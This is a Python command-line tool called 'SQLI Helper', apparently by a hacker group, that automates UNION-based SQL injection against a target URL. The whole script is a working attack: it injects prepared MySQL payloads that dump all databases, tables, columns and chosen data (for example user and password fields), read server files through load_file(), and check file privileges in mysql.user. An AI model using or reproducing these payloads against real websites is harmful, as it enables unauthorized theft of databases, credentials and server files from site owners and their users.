#!/usr/bin/python
import requests,sys,os,readline,re,binascii
from urllib.parse import unquote
dios = "make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)"

def hexx(string):
	x = binascii.b2a_hex(string.encode('utf-8'))
	return "0x"+x.decode('utf-8')

def execute(url):
	x 	 = requests.get(url.replace("inject","CONCAT(0x2566696c746879726f6f7425,user(),0x2566696c746879726f6f7425)"))
	user = x.text.split('%filthyroot%')[1]
	try:
		cmd  = input(user + " > ")
		if cmd == "clear":
			os.system("clear")
			execute(url)
		elif cmd == "dios":
			cmd = dios
		elif cmd == "databases":
			cmd = "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)"
		elif cmd == "tables":
			cmd = "(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,4,0x30),0x3a20,table_name,0x3c62723e))))x)"
		elif cmd == "database":
			cmd = "database()"
		elif cmd == "version":
			cmd = "version()"
		elif cmd == "user":
			cmd = "user()"
		elif cmd == "columns":
			tbxx = input("Table : ")
			cmd = "(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME="+hexx(tbxx)+")AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,column_name,0x3c62723e)))))x)"
			#print (tbzz)
			#exit()
		elif cmd == "data":
			db = input("Database : ")
			tb = input("Table    : ")
			co = input("Columns (ex : id,user,pass,)  : ")
			cmd = cmd = "(SELECT(@x)FROM(SELECT(@x:=0x00) ,(SELECT(@x)FROM("+db+"."+tb+")WHERE(@x)IN(@x:=CONCAT(0x20,@x,0x3c62723e,"+co+",0x3c62723e))))x)"
		elif cmd == "loadfile":
			file = input("File Path : ")
			cmd = "load_file("+hexx(file)+")"
		elif cmd == "filepriv":
			cmd = "(SELECT(CONCAT(file_priv)) FROM mysql.user)"
		r 	   = requests.get(url.replace("inject","CONCAT(0x2566696c746879726f6f7425,"+ cmd +",0x2566696c746879726f6f7425)"))
		output = r.text.split('%filthyroot%')[1]
		if re.search("<li>",output):
			x = output.split("<li>")
			for i in x:
				print(i)
			execute(url)
		elif re.search("<br>",output):
			x = output.split("<br>")
			for i in x:
				print(i)
			execute(url)
		print("Output :",output)
	except Exception:
		#print(r.text)
		print("Syntax Error!")
		execute(url)

	execute(url)

if len(sys.argv) < 2:
	print("""############### | By FilthyRoot
# SQLI Helper # | @jogjakartahackerlink
############### | ---------------------

Usage : sqli.py \"http://target.com/index.php?id=1'UNION SELECT inject,2-- -\"""")
else:
	if re.search("http",sys.argv[1]):
		url = sys.argv[1]
	elif re.search('\%68\%74\%74\%70', sys.argv[1]):
		url = unquote(sys.argv[1])
	else:
		url = "http://"+sys.argv[1]
	execute(url)